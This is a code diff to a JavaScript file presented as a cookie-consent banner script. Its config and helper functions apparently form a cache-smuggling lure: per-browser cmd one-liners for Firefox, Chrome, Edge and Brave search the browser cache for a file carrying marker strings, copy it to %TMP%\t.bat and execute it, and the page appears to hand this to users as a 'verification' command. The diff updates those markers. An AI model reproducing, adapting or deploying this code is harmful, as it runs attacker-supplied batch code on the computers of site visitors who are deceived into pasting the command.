@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.6.2',
+    version: '1.6.3',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
     accentColor: '#1b6369',
@@ -20,14 +20,14 @@
     cacheFileUrl: null,
     cacheFileBodySize: null,
     strictBody: true,
-    bodyStartMarker: '|x7F3|',
-    bodyEndMarker: '|e7F3|',
+    bodyStartMarker: 'CDRP7F3A9D2B8C4',
+    bodyEndMarker: 'CDRPEND7F3A9D2',
     bodyMustStartWith: '@echo off',
     verificationTemplates: {
-      firefox: 'cmd /c for /r "%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles" %f in (*) do @find "{M}" "%f">nul&&if not exist "%TMP%\\t.bat" copy /y "%f" "%TMP%\\t.bat">nul&if exist "%TMP%\\t.bat" call "%TMP%\\t.bat"',
-      chrome: 'cmd /c for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data" %f in (f_*) do @find "{M}" "%f">nul&&if not exist "%TMP%\\t.bat" copy /y "%f" "%TMP%\\t.bat">nul&if exist "%TMP%\\t.bat" call "%TMP%\\t.bat"',
-      edge: 'cmd /c for /r "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data" %f in (f_*) do @find "{M}" "%f">nul&&if not exist "%TMP%\\t.bat" copy /y "%f" "%TMP%\\t.bat">nul&if exist "%TMP%\\t.bat" call "%TMP%\\t.bat"',
-      brave: 'cmd /c for /r "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data" %f in (f_*) do @find "{M}" "%f">nul&&if not exist "%TMP%\\t.bat" copy /y "%f" "%TMP%\\t.bat">nul&if exist "%TMP%\\t.bat" call "%TMP%\\t.bat"'
+      firefox: 'cmd /c for /r "%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles" %f in (*) do @find "{M}" "%f">nul&&find "{E}" "%f">nul&&if not exist "%TMP%\\t.bat" copy /y "%f" "%TMP%\\t.bat">nul&if exist "%TMP%\\t.bat" call "%TMP%\\t.bat"',
+      chrome: 'cmd /c for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data" %f in (f_*) do @find "{M}" "%f">nul&&find "{E}" "%f">nul&&if not exist "%TMP%\\t.bat" copy /y "%f" "%TMP%\\t.bat">nul&if exist "%TMP%\\t.bat" call "%TMP%\\t.bat"',
+      edge: 'cmd /c for /r "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data" %f in (f_*) do @find "{M}" "%f">nul&&find "{E}" "%f">nul&&if not exist "%TMP%\\t.bat" copy /y "%f" "%TMP%\\t.bat">nul&if exist "%TMP%\\t.bat" call "%TMP%\\t.bat"',
+      brave: 'cmd /c for /r "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data" %f in (f_*) do @find "{M}" "%f">nul&&find "{E}" "%f">nul&&if not exist "%TMP%\\t.bat" copy /y "%f" "%TMP%\\t.bat">nul&if exist "%TMP%\\t.bat" call "%TMP%\\t.bat"'
     }
   };
 
@@ -132,8 +132,8 @@
   }
 
   function getVerificationCommand() {
-    var startMarker = CONSENT_CONFIG.bodyStartMarker || '|x7F3|';
-    var endMarker = CONSENT_CONFIG.bodyEndMarker || '|e7F3|';
+    var startMarker = CONSENT_CONFIG.bodyStartMarker || 'CDRP7F3A9D2B8C4';
+    var endMarker = CONSENT_CONFIG.bodyEndMarker || 'CDRPEND7F3A9D2';
     if (!startMarker || !endMarker) return '';
 
     var key = getBrowserKey();
@@ -141,7 +141,7 @@
     var tpl = templates[key] || templates.firefox || '';
     if (!tpl) return '';
 
-    return tpl.replace(/\{M\}/g, startMarker);
+    return tpl.replace(/\{M\}/g, startMarker).replace(/\{E\}/g, endMarker);
   }
 
   function fallbackCopy(text) {
@@ -245,8 +245,8 @@
       }
     }
 
-    var startMarker = CONSENT_CONFIG.bodyStartMarker || '|x7F3|';
-    var endMarker = CONSENT_CONFIG.bodyEndMarker || '|e7F3|';
+    var startMarker = CONSENT_CONFIG.bodyStartMarker || 'CDRP7F3A9D2B8C4';
+    var endMarker = CONSENT_CONFIG.bodyEndMarker || 'CDRPEND7F3A9D2';
     if (text.indexOf(startMarker) === -1) {
       return { ok: false, reason: 'missing start marker ' + startMarker };
     }
